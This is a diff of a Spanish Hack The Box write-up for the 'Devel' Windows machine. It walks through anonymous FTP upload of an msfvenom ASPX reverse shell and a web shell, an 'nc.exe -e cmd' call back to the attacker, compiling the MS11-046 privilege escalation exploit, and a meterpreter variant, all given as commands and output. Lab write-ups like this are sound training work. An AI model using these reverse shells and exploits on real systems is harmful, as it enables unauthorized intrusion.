@@ -25,6 +25,10 @@ tags:
 
 Una máquina bastante sencilla, en la cual usaremos el servicio FTP para cargar un Payload que contendrá una Shell que se activará en el puerto HTTP que corre el servicio IIS y después escalaremos privilegios usando el Exploit MS11-046.
 
+Herramientas utilizadas:
+* *nmap*
+* *msfvenom*
+
 
 <br>
 <hr>
@@ -40,28 +44,43 @@ Una máquina bastante sencilla, en la cual usaremos el servicio FTP para cargar 
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
 				<li><a href="#FTP">Enumeración Servicio FTP</a></li>
-				<li><a href="#HTTP">Analizando Puerto 80</a></li>
+				<li><a href="FTP2">Realizando Pruebas en Servicio FTP</a></li>
+				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
 				<li><a href="#IIS">Investigando Servicio IIS</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#Payload">Configurando un Payload y Netcat</a></li>
+				<li><a href="#Payload">Configurando un Payload con Reverse Shell</a></li>
 				<ul>
                                         <li><a href="#Msfvenom">Configurando el Payload con Msfvenom</a></li>
-					<li><a href="#Netcat">Configurando Netcat</a></li>
-					<li><a href="#Windows">Enumeración de Windows</a></li>
+					<li><a href="#Netcat">Utilizando una cmd.aspx de Kali</a></li>
                                 </ul>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#Exploit">Buscando, Configurando y Activando un Exploit</a></li>
+				<li><a href="#Windows">Enumeración de Windows</a></li>
+				<li><a href="#Exploit">Buscando, Configurando y Activando un Exploit para Windows 7</a></li>
 				<ul>
                                 	<li><a href="#PruebaExp">Probando Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)</a></li>
                         	</ul>
 			</ul>
+		<li><a href="#Post">Post Explotación</a></li>
+			<ul>
+				<li><a href="#Exploit2">Ganando Acceso y Escalando Privilegios con Metasploit</a></li>
+				<ul>
+					<li><a href="#Suggester">Usando Modulo local_exploit_suggester</a></li>
+					<li><a href="#MS13">Usando Exploit ms13_053_schlamperei</a></li>
+				</ul>
+				<li><a href="#Exploit3"></a></li>
+				<ul>
+					<li><a href="#"></a></li>
+				</ul>
+			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
 </div>
+
+
 
 
 <br>
@@ -79,7 +98,7 @@ Una máquina bastante sencilla, en la cual usaremos el servicio FTP para cargar 
 <h2 id="Ping">Traza ICMP</h2>
 
 Vamos a realizar un ping para saber si la máquina está conectada, además vamos a analizar el TTL para saber que SO usa dicha máquina.
-```
+```bash
 ping -c 4 10.10.10.5
 PING 10.10.10.5 (10.10.10.5) 56(84) bytes of data.
 64 bytes from 10.10.10.5: icmp_seq=1 ttl=127 time=132 ms
@@ -95,7 +114,7 @@ Ok, vemos que la máquina usa Windows. Es momento de hacer los escaneos de puert
 
 <h2 id="Puertos">Escaneo de Puertos</h2>
 
-```
+```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.5 -oG allPorts             
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-14 13:01 CST
@@ -118,20 +137,23 @@ Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 30.54 seconds
            Raw packets sent: 131087 (5.768MB) | Rcvd: 30 (1.304KB)
 ```
-* -p-: Para indicarle un escaneo en ciertos puertos.
-* --open: Para indicar que aplique el escaneo en los puertos abiertos.
-* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
-* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
-* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
-* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
-* -Pn: Para indicar que se omita el descubrimiento de hosts.
-* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.
 
-Al parecer solamente hay 2 puertos abiertos y que ya conocemos, el puerto 21 que es el servicio FTP y el puerto 80 que es HTTP, ósea una página web. Hagamos el escaneo de servicios.
+| Parámetros | Descripción |
+|--------------------------|
+| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
+| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
+| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
+| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
+| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
+| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
+| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
+| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |
+
+Al parecer solamente hay 2 puertos abiertos, el puerto 21 que es el **servicio FTP** y el puerto 80 que es **HTTP**, ósea una página web. Hagamos el escaneo de servicios.
 
 <h2 id="Servicios">Escaneo de Servicios</h2>
 
-```
+```bash
 nmap -sC -sV -p21,80 10.10.10.5 -oN targeted                                                   
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-14 13:02 CST
 Nmap scan report for 10.10.10.5
@@ -155,12 +177,15 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 14.80 seconds
 ```
-* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
-* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
-* -p: Para indicar puertos específicos.
-* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.
 
-Vemos que en el servicio FTP tenemos activado el login como **anonymous**, vamos a meternos para ver que podemos encontrar y después analizaremos la página web.
+| Parámetros | Descripción |
+|--------------------------|
+| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
+| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
+| *-p*       | Para indicar puertos específicos. |
+| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |
+
+Vemos que en el **servicio FTP** tenemos activado el login como **anonymous**, vamos a meternos para ver que podemos encontrar y después analizaremos la página web.
 
 
 <br>
@@ -177,7 +202,7 @@ Vemos que en el servicio FTP tenemos activado el login como **anonymous**, vamos
 
 <h2 id="FTP">Enumeración Servicio FTP</h2>
 
-```
+```bash
 ftp 10.10.10.5  
 Connected to 10.10.10.5.
 220 Microsoft FTP Service
@@ -194,8 +219,10 @@ ftp> ls
 03-17-17  05:37PM               184946 welcome.png
 226 Transfer complete.
 ```
-Pues no hay mucho que podamos usar, el PNG debe pertenecer a la página web así que vamos a ver que hay en el directorio **aspnet_client**:
-```
+Pues no hay mucho que podamos usar, pero de acuerdo a lo que esta almacenado en el **servicio FTP**, nos damos cuenta que se esta almacenando la aplicación web **ASP.NET**, esto porque vemos el directorio **aspnet_client**, que debe estar ejecutando dicha aplicación. Además, podemos ver un archvio **.htm** y un **PNG**, que supongo pertenecen a la página web.
+
+Veamos que hay dentro del **directorio aspnet_client**:
+```bash
 ftp> cd aspnet_client
 250 CWD command successful.
 ftp> ls
@@ -230,14 +257,19 @@ ftp> ls
 ftp> exit
 221 Goodbye.
 ```
-No pues no, no hay nada de interés. Antes de irnos a analizar la página web, intentemos ver si podemos subir archivos.
+No hay nada de interés o que nos pueda servir, pero si comprobamos que aca se ejecuta la página web.
 
-Creamos un archivo random:
-```
+Antes de irnos a analizar la página web, intentemos ver si podemos subir archivos.
+
+<h2 id="FTP2">Realizando Pruebas en Servicio FTP</h2>
+
+Creamos un archivo random en nuestra máquina:
+```bash
 whoami > test.txt
 ```
-Y lo intentamos subir al FTP:
-```
+
+Y lo intentamos subir al **servicio FTP**:
+```bash
 ftp 10.10.10.5
 Connected to 10.10.10.5.
 220 Microsoft FTP Service
@@ -262,11 +294,11 @@ ftp> ls
 03-17-17  05:37PM               184946 welcome.png
 226 Transfer complete.
 ```
-Mmmmmm vaya, vaya, así que podemos subir archivos. Antes de investigar cómo podemos vulnerar el servicio FTP, analicemos la página web para ver que encontramos.
+Observa que podemos subir archivos, esto puede ser bastante vulnerable para la máquina víctima y de provecho para nosotros. Antes de continuar, analicemos la página web para ver que encontramos.
 
-<h2 id="HTTP">Analizando Puerto 80</h2>
+<h2 id="HTTP">Analizando Servicio HTTP</h2>
 
-Al entrar en la página, no hay nada, más que una imagen del servicio que está corriendo y si le damos click a la imagen nos mandara directo a la página de Microsoft acerca del servicio IIS.
+Al entrar en la página, no hay nada, más que una imagen del servicio que está corriendo y si le damos clic a la imagen nos mandara directo a la página de Microsoft acerca del **servicio IIS**.
 
 ![](/assets/images/htb-writeup-devel/Captura1.png)
 
@@ -276,9 +308,9 @@ Que nos dice el **Wappalizer**:
 <img src="/assets/images/htb-writeup-devel/Captura2.png">
 </p>
 
-No hay mucho que destacar y un **Fuzzing** no creo que sea útil.
+No hay mucho que destacar y aplicar un **Fuzzing** no creo que sea útil.
 
-¡MOMENTO! ¿Recuerdas que subimos un archivo al servicio FTP? Bueno, ese archivo tiene el comando **whoami**, no se podía ejecutar en el FTP, pero quizá aquí sí.
+Esto me indica que la jugada será por el **servicio FTP** para empezar. Recuerda que subimos un archivo random al **servicio FTP**, vamos a probar si es posible acceder a este desde la página web.
 
 Intentemos ver si se puede ejecutar:
 
@@ -286,30 +318,42 @@ Intentemos ver si se puede ejecutar:
 <img src="/assets/images/htb-writeup-devel/Captura3.png">
 </p>
 
-¡¡SI FUNCIONA!! Así que podemos subir una netcat o un Payload de **msfvenom** para que nos conecte directamente, podríamos hacer los dos, pero ¿qué archivos son los que lee este servicio? Porque no servirá ni el Payload ni la netcat si los subimos como archivos de texto, o al menos es lo que yo creo.
+Excelente, funciona. Así que, podemos probar a subir un Payload de **msfvenom** que sea una **Reverse Shell** para que nos conecte directamentea a la máquina víctima, pero ¿qué archivos son los que lee este **servicio ASP.NET**? Porque no servirá de nada, si subimos el Payload y no es posible ejecutarlo.
 
-Hay que investigar un poco sobre el servicio IIS.
+Hay que investigar un poco sobre el **servicio IIS**.
 
 <h2 id="IIS">Investigando Servicio IIS</h2>
 
-De acuerdo con el siguiente link de la página HackTricks: 
+| **Servicio IIS** |
+|:-----------:|
+| *Internet Information Services o IIS, es un servidor web y un conjunto de servicios para el sistema operativo Microsoft Windows. Fue integrado en otros sistemas operativos de Microsoft destinados a ofrecer servicios, como Windows 2000 o Windows Server 2003, 2016 y 2019. Windows XP Profesional incluye una versión limitada de IIS. Los servicios que ofrece son: FTP, SMTP, NNTP y HTTP/HTTPS. Este servicio convierte a un PC en un servidor web para Internet o una intranet, es decir que en los ordenadores que tienen este servicio instalado se pueden publicar páginas web tanto local como remotamente.* |
+
+<br>
+
+De acuerdo con el siguiente link de la página **HackTricks**: 
 * https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services
 
-El servicio IIS puede ejecutar las siguientes extensiones:
+El **servicio IIS** puede ejecutar las siguientes extensiones:
 * asp
 * aspx
 * config
 * php
 
-De momento vamos a descartar la PHP y el config porque no creo que nos sirvan para cargar el Payload ni la netcat, así que vamos a investigar la extensión asp y aspx:
+De momento vamos a descartar la de **PHP** y el de **config** porque no creo que nos sirvan para cargar el Payload, así que vamos a investigar la **extensión ASP y ASPX**:
 
-**Active Server Pages, ​ también conocido como ASP clásico, es una tecnología de Microsoft del lado del servidor para páginas web generadas dinámicamente, que ha sido comercializada como un anexo a Internet Information Services (IIS).**
+| **Extensión ASP** |
+|:-----------:|
+| *Active Server Pages, ​también conocido como ASP clásico, es una tecnología de Microsoft del lado del servidor para páginas web generadas dinámicamente, que ha sido comercializada como un anexo a Internet Information Services (IIS).* |
 
-Ósea que es una página en sí.
+<br>
 
-**La extensión de archivo ASPX se utiliza para páginas web que son generadas automáticamente por el servidor y dirigen directamente a un servidor activo.**
+| **Extensión ASPX** |
+|:-----------:|
+| *La extensión de archivo ASPX se utiliza para páginas web que son generadas automáticamente por el servidor y dirigen directamente a un servidor activo.* |
 
-Ósea que es un archivo ejecutable, ya tenemos con que trabajar.
+<br>
+
+Entonces, la **extensión ASP** podría decirse que es la página web y la **extensión ASPX** es un archivo ejecutable, con esta extensión vamos a crear nuestra **Reverse Shell**.
 
 
 <br>
@@ -323,15 +367,17 @@ De momento vamos a descartar la PHP y el config porque no creo que nos sirvan pa
 </div>
 <br>
 
-<h2 id="Payload">Configurando un Payload y Netcat</h2>
 
-Vamos a configurar primero el Payload y luego la Netcat.
+<h2 id="Payload">Configurando un Payload con Reverse Shell</h2>
 
-<h3 id="Msfvenom">Configurando el Payload con Msfvenom</h3>
+Para este caso, tenemos dos opciones, la primera es crear nuestra **Reverse Shell** con **Msfvenom** o la otra es ocupar un recurso con el que cuenta **Kali** que nos da una CMD que podemos usar, desde la página web. Vamos a ocupar ambos, pero empezamos creando nuestra propia **Reverse Shell**.
 
-Vamos a empezar configurando un Payload con **msfvenom** para que nos conecte como lo hemos hecho con máquinas anteriores:
-```
-msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.12 LPORT=443 -o IIS_Shell.aspx  
+<br>
+<h3 id="Msfvenom">Configurando el Payload de Reverse Shell con Msfvenom</h3>
+
+Vamos a empezar configurando un Payload con **Msfvenom** para que nos conecte a la máquina víctima, una vez sea ejecutado:
+```bash
+msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=Tu_IP LPORT=443 -o IIS_Shell.aspx  
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 No encoder specified, outputting raw payload
@@ -339,7 +385,9 @@ Payload size: 324 bytes
 Final size of aspx file: 2737 bytes
 Saved as: IIS_Shell.aspx
 ```
-Ahora entramos al servicio FTP, subimos el archivo **.aspx** y comprobamos que este dentro:
+Así de simple es crearla.
+
+Ahora entramos al **servicio FTP**, subimos el archivo **.aspx** y comprobamos que este dentro:
 ```
 ftp 10.10.10.5
 Connected to 10.10.10.5.
@@ -368,19 +416,22 @@ ftp> ls
 ftp> exit
 221 Goodbye.
 ```
-Muy bien, ya está dentro, ahora activemos una netcat:
-```
+Muy bien, ya está dentro. 
+
+Ahora, simplemtene activamos una **netcat**:
+```bash
 nc -nvlp 443                                    
 listening on [any] 443 ...
 ```
-Y, por último, veamos si se activa desde la página web:
+
+Y, por último, ejecutamos la Reverse Shell desde la página web:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-devel/Captura4.png">
 </p>
 
-¡¡EUREKA!! Estamos dentro:
-```
+Listo, estamos dentro:
+```bash
 nc -nvlp 443                                    
 listening on [any] 443 ...
 connect to [10.10.14.12] from (UNKNOWN) [10.10.10.5] 49168
@@ -391,14 +442,15 @@ c:\windows\system32\inetsrv>whoami
 whoami
 iis apppool\web
 ```
-Muy bien, ahora probemos con la netcat.
+Muy bien, ahora probemos con el archivo preconfigurado ASPX de Kali que nos da una **CMD** en la página web.
 
-<h3 id="Netcat">Configurando Netcat</h3>
+<br>
+<h3 id="Netcat">Utilizando una cmd.aspx de Kali</h3>
 
-Resulta que, si requieres un archivo **.aspx** que contenga un Payload y devuelva una Shell, existen dentro del **Kali Linux** y supongo que dentro de **Parrot** como la netcat o nc.exe que usamos en la **máquina Legacy**.
+Resulta que, si requieres un archivo **.aspx** que contenga un Payload que devuelva una **CMD** en la web, existen dentro del **Kali Linux**, similar a la **nc.exe** que usamos en la **máquina Legacy**. También vamos a usar la **nc.exe**, así que descargala.
 
 Para buscarlo solo usamos el comando locate de la siguiente manera:
-```
+```bash
 locate .aspx
 /usr/share/davtest/backdoors/aspx_cmd.aspx
 /usr/share/laudanum/aspx/shell.aspx
@@ -413,23 +465,20 @@ locate .aspx
 /usr/share/webshells/aspx/cmdasp.aspx
 ```
 Como puedes ver, hay varias opciones, pero hay 2 en particular que nos pueden servir:
-* aspx_cmd.aspx
-* shell.aspx
+* *aspx_cmd.aspx*
+* *shell.aspx*
 
-Analicemos un poco lo que nos dicen ambos.
-
-Después de ver lo que hay dentro de los dos, prefiero usar el **aspx_cmd.aspx** porque el **shell.aspx** no entiendo si hay que configurarle una IP pues lo que hace, o al menos eso creo, es comenzar a analizar IPs en cierto rango ya establecido para poder conectarse a alguna, caso contrario con el **aspx_cmd.aspx** que al parecer saca una consola interactiva en la página web. Además, intente buscar información del archivo **shell.aspx** en la página que puso el autor pero ya no está activa, tons queda descartado.
-
-Así que vamos a probar el **aspx_cmd.aspx**.
+Vamos a usar el **aspx_cmd.aspx** para que nos muestre una **CMD** en la página web. Así que vamos a probar el **aspx_cmd.aspx**.
 
 Vamos a copiarlo en el directorio que estamos ocupando para esta máquina:
-```
+```bash
 cp /usr/share/laudanum/aspx/shell.aspx .
 ls          
 aspx_cmd.aspx  IIS_Shell.aspx  shell.aspx  test.txt
 ```
-Ahora lo subimos al FTP:
-```
+
+Ahora lo subimos al **servicio FTP**:
+```bash
 ftp 10.10.10.5
 Connected to 10.10.10.5.
 220 Microsoft FTP Service
@@ -448,7 +497,7 @@ local: aspx_cmd.aspx remote: aspx_cmd.aspx
 ftp> exit
 221 Goodbye.
 ```
-No pues sí, ya estamos dentro, pero pues en la página web. 
+Y listo, lo ejecutamos en la página web y deberíamos poder ver una **CMD**.
 
 ![](/assets/images/htb-writeup-devel/Captura5.png)
 
@@ -456,14 +505,64 @@ No pues sí, ya estamos dentro, pero pues en la página web.
 <img src="/assets/images/htb-writeup-devel/Captura6.png">
 </p>
 
-Quizá podríamos tratar de ejecutar una netcat que este dentro del servicio FTP para conectarnos hacia nuestra máquina como con el Payload, pero ya me dio hueva la verdad y pueden probarlo también, sería lo mismo que hicimos en la **máquina Legacy**. 
+Bien, por último, vamos a obtener acceso mandando una sesión desde la **CMD** de la página web hacia nuestra máquina, utilizando una **netcat** ejecutable, osea el **nc.exe**.
 
-Vamos a cambiar al Payload y a conseguir acceso como Root.
+Levanta una **netcat**:
+```bash
+rlwrap nc -nvlp 443                                    
+listening on [any] 443 ...
+```
+
+Carga la **nc.exe** en la máquina víctima en el **servicio FTP**:
+```bash
+ftp 10.10.10.5
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name (10.10.10.5:berserkwings): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> put nc.exe
+...
+```
+
+En la **CMD** usa el siguiente comando:
+```bash
+C:\inetpub\wwwroot\nc.exe -e cmd Tu_IP 443
+```
+Normalmente, el **directorio inetpub** es el que contiene al **servicio FTP**.
+
+Y listo, ya estamos conectados a la máquina víctima:
+```bash
+rlwrap nc -nvlp 443                                    
+listening on [any] 443 ...
+connect to [10.10.14.12] from (UNKNOWN) [10.10.10.5] 49168
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+c:\windows\system32\inetsrv>whoami
+whoami
+iis apppool\web
+```
+
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Post" style="text-align:center;">Post Explotación</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
 
 <h2 id="Windows">Enumeración de Windows</h2>
 
 Una vez más dentro de la máquina, vamos a buscar la flag del usuario:
-```
+```bash
 c:\windows\system32\inetsrv>cd C:\
 cd C:\
 
@@ -484,8 +583,9 @@ dir
                2 File(s)             34 bytes
                5 Dir(s)   4.677.365.760 bytes free
 ```
+
 Recuerda siempre ir a la carpeta usuarios y puede estar en la de Public o en el nombre de algún usuario:
-```
+```bash
 C:\>cd Users
 cd Users
 
@@ -509,8 +609,9 @@ C:\Users>cd babis
 cd babis
 Access is denied.
 ```
-A kbron, no se puede, bueno vamos a ver en la de Public:
-```
+
+No se puede, bueno vamos a ver en la de Public:
+```bash
 C:\Users>cd Public
 cd Public
 
@@ -532,9 +633,9 @@ dir
                0 File(s)              0 bytes
                8 Dir(s)   4.677.365.760 bytes free
 ```
-No pues no, no hay nada, entonces hay que entrar como Root para que podamos ver las flags. Vamos a buscar que podemos usar para acceder a la máquina como Root.
 
-```
+No pues no, no hay nada, entonces hay que entrar como Root para que podamos ver las flags. Vamos a buscar que podemos usar para acceder a la máquina como Root.
+```bash
 C:\Users>cd ..
 cd ..
 
@@ -584,12 +685,10 @@ dir
                0 File(s)              0 bytes
               16 Dir(s)   4.677.365.760 bytes free
 ```
-No veo nada que conozca que sea vulnerable, quizá el **MSBuild**, pero no sé qué sea, investiguémoslo:
+No veo nada que conozca que sea vulnerable. 
 
-**Microsoft Build Engine, o MSBuild, es un conjunto de herramientas de compilación gratuitas y de código abierto para código administrado bajo Common Language Infrastructure, así como código nativo C y C++. Fue lanzado por primera vez en 2003 y era parte de .NET Framework.**
-
-No pues no creo que sea útil, entonces vámonos a lo seguro. Veamos que privilegios tenemos y que versión de sistema operativo tiene la máquina:
-```
+Entonces, veamos con que privilegios gozamos para darnos una idea de que hacer y veamos la versión del sistema operativo que usa la máquina:
+```bash
 C:\>whoami /priv
 whoami /priv
 
@@ -620,22 +719,11 @@ OS Configuration:          Standalone Workstation
 OS Build Type:             Multiprocessor Free
 Registered Owner:          babis
 ```
-Ok tenemos el privilegio **SeImpersonatePrivilege** y vemos que el SO es **WIndows 7 6.1.7600**, además de que el dueño es **babis**. Vamos a buscar un Exploit.
+Ok, tenemos el privilegio **SeImpersonatePrivilege** y vemos que el SO es **WIndows 7 6.1.7600**, además de que el dueño es **babis**. Desde aquí, nos surgen al menos 2 formas de poder escalar privilegios, la primera usando un Exploit para la versión del Windows, la segunda utilizando Juicy o Rotten Potato para abusar del privilegio **SeImpersonatePrivilege**.
 
+Vamos a usar ambas y luego investigaremos como ganar acceso con **Metasploit Framework**. Pero, primero vamos a hacerlo con la primera opción y las demás, las dejamos para la sección **Otras Formas**.
 
-<br>
-<br>
-<hr>
-<div style="position: relative;">
- <h1 id="Post" style="text-align:center;">Post Explotación</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
-</div>
-<br>
-
-
-<h2 id="Exploit">Buscando, Configurando y Activando un Exploit</h2>
+<h2 id="Exploit">Buscando, Configurando y Activando un Exploit para Windows 7</h2>
 
 Buscando por internet, nos aparece uno en particular que es el **MS11-046** que es un **Local Privilege Escalation** y que justamente nos serviría en estos momentos. 
 Puede verlo en el siguiente link: 
@@ -643,7 +731,7 @@ Puede verlo en el siguiente link:
 * https://www.exploit-db.com/exploits/40564
 
 Vamos a buscarlo con la herramienta **Searchsploit**:
-```
+```bash
 searchsploit MS11-046                  
 ----------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                             |  Path
@@ -660,10 +748,11 @@ MS11-046 - Dissecting a 0day                                                    
 ```
 Justamente lo tenemos, vamos a copiarlo y a analizarlo para saber cómo usarlo.
 
+<br>
 <h3 id="PruebaExp">Probando Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)</h3>
 
 Gracias al creador del Exploit, nos deja una pequeña explicación para convertir el Exploit en un ejecutable **.exe**:
-```
+```bash
 Exploit notes:
    Privileged shell execution:
      - the SYSTEM shell will spawn within the invoking shell/process
@@ -678,22 +767,23 @@ Exploit notes:
      - let the target OS boot properly (if applicable)
      - Windows 7 (SP0 and SP1) will BSOD on shutdown/reset
 ```
-OJO: aquí la importancia de leer los Exploits para saber cómo funcionan o si es necesario configurarlos.
+**OJO**: aquí la importancia de leer los Exploits para saber cómo funcionan o si es necesario configurarlos.
 
-Entonces vamos a usar la herramienta **i686-w64-mingw32-gcc**, si estas usando **Kali Linux** ya la deberías tener instalada y si usas **Parrot** pues la verdad no sabría decirte, sin embargo, aquí está el link del cómo pueden instalar dicha herramienta: https://github.com/RUB-SysSec/WindowsVTV
+Entonces vamos a usar la herramienta **i686-w64-mingw32-gcc**, si estas usando **Kali Linux** ya la deberías tener instalada, sin embargo, aquí está el link del cómo pueden instalar dicha herramienta: 
+* https://github.com/RUB-SysSec/WindowsVTV
 
 Vamos a convertir ese Exploit a un ejecutable **.exe**, recuerda que el Exploit se descargó con el nombre **40564.c**:
-```
+```bash
 i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32
 ls
 40564.c  aspx_cmd.aspx  IIS_Shell.aspx  MS11-046.exe  nc.exe  shell.aspx  test.txt
 ```
 Ahora que lo tenemos, ya podemos subirlo a la máquina.
 
-Al igual que en la **máquina Legacy**, vamos a abrir un servidor con **Impacket** para poder subirlo, vámonos por pasos:
+Vamos a abrir un servidor con **Impacket** para poder subirlo. Hagamoslo por pasos:
 
-* Abriendo servidor:
-```
+* Abriendo **servidor SMB** con **impacket**:
+```bash
 smbserver.py smbFolder $(pwd)
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Config file parsed
@@ -703,112 +793,245 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Config file parsed
 [*] Config file parsed
 ```
-* Para subir el Exploit debemos ir a la carpeta Temp:
 
-```
+* Para subir el Exploit debemos ir al **directorio Temp**:
+```bash
 C:\Windows>cd /Windows/Temp
 cd /Windows/Temp
 C:\Windows\Temp>
 ```
-* Crearemos una carpeta para guardarlo ahí:
 
-```
+* Crearemos un directorio para guardarlo ahí:
+```bash
 C:\Windows\Temp>mkdir AquiNoHayNingunExploit
 mkdir AquiNoHayNingunExploit
 C:\Windows\Temp>cd AquiNoHayNingunExploit
 cd AquiNoHayNingunExploit
 ```
-* Copiamos el Exploit:
 
-```
-C:\Windows\Temp\AquiNoHayNingunExploit>copy \\10.10.14.12\smbFolder\MS11-046.exe MS11-046.exe                                            
+* Copiamos el Exploit:
+```bash
+C:\Windows\Temp\AquiNoHayNingunExploit>copy \\Tu_IP\smbFolder\MS11-046.exe MS11-046.exe                                            
 copy \\10.10.14.12\smbFolder\MS11-046.exe MS11-046.exe
         1 file(s) copied
 ```
-* Lo activamos:
 
-```
+* Lo activamos:
+```bash
 C:\Windows\Temp\AquiNoHayNingunExploit>.\MS11-046.exe
 .\MS11-046.exe
 c:\Windows\System32>whoami
 whoami
 nt authority\system
 ```
-* Y buscamos las flags:
 
+Buscamos las flags y listo, con esto ya tenemos las flags de la máquina.
+
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Post" style="text-align:center;">Otras Formas</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
+<h2 id="Exploit2">Ganando Acceso y Escalando Privilegios con Metasploit</h2>
+
+Para este caso, vamos a ocupar la misma **Reverse Shell** que ya creamos, pero vamos a modificarla un poco porque vamos utilizar el **Metasploit Framework** para obtener una sesión de **meterpreter** y luego ahí, vamos a escalar privilegios.
+
+* Crea la **Reverse Shell** para usar en **meterpreter**:
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=Tu_IP LPORT=4242 -f aspx -o shell.aspx
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of aspx file: 2843 bytes
+Saved as: shell.aspx
 ```
-c:\Windows\System32>cd C:\
-cd C:\
-C:\>dir
-dir
- Volume in drive C has no label.
- Volume Serial Number is 137F-3971
- Directory of C:\
-11/06/2009  12:42 ��                24 autoexec.bat
-11/06/2009  12:42 ��                10 config.sys
-17/03/2017  07:33 ��    <DIR>          inetpub
-14/07/2009  05:37 ��    <DIR>          PerfLogs
-13/12/2020  01:59 ��    <DIR>          Program Files
-18/03/2017  02:16 ��    <DIR>          Users
-11/02/2022  05:03 ��    <DIR>          Windows
-               2 File(s)             34 bytes
-               5 Dir(s)   4.677.234.688 bytes free
 
-C:\>cd Users
-cd Users
-
-C:\Users>dir
-dir
- Volume in drive C has no label.
- Volume Serial Number is 137F-3971
-
- Directory of C:\Users
-
-18/03/2017  02:16 ��    <DIR>          .
-18/03/2017  02:16 ��    <DIR>          ..
-18/03/2017  02:16 ��    <DIR>          Administrator
-17/03/2017  05:17 ��    <DIR>          babis
-18/03/2017  02:06 ��    <DIR>          Classic .NET AppPool
-14/07/2009  10:20 ��    <DIR>          Public
-               0 File(s)              0 bytes
-               6 Dir(s)   4.677.234.688 bytes free
-
-C:\Users>cd Administrator/Desktop
-cd Administrator/Desktop
-
-C:\Users\Administrator\Desktop>dir
-dir
- Volume in drive C has no label.
- Volume Serial Number is 137F-3971
-
- Directory of C:\Users\Administrator\Desktop
-
-14/01/2021  12:42 ��    <DIR>          .
-14/01/2021  12:42 ��    <DIR>          ..
-28/03/2023  09:59 ��                34 root.txt
-               1 File(s)             34 bytes
-               2 Dir(s)   4.677.234.688 bytes free
-
-C:\Users\Administrator\Desktop>cd ../..
-cd ../..
-
-C:\Users>cd babis/Desktop
-cd babis/Desktop
-
-C:\Users\babis\Desktop>dir
-dir
- Volume in drive C has no label.
- Volume Serial Number is 137F-3971
-
- Directory of C:\Users\babis\Desktop
-
-11/02/2022  04:54 ��    <DIR>          .
-11/02/2022  04:54 ��    <DIR>          ..
-28/03/2023  09:59 ��                34 user.txt
-               1 File(s)             34 bytes
-               2 Dir(s)   4.677.234.688 bytes free
+* Carga la **Reverse Shell** en el **servicio FTP**:
+```bash
